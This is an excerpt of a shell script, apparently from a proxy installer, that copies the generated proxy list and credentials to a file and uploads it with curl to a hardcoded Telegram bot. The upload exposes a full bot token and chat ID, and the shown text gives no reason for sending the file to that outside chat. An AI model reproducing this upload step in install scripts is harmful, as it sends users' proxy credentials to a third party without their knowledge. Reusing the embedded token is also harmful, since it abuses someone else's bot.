...
#    echo "Password: ${PASS}"
    ...
    cp proxy.txt "$NAME_FILE_SEND".txt

    curl -X POST -F 'document=@/home/proxy-installer/'"$NAME_FILE_SEND"'.txt' -F 'chat_id=-1002182808553' https://api.telegram.org/bot6572357571:AAE9C4oJiQ5Fz5OR9gzMGW6aWC2pKQ1fcug/sendDocument
...
IPV6_RANGE=$1
USER_ACCOUNT=$2
NAME_FILE_SEND=$USER_ACCOUNT+$IP4
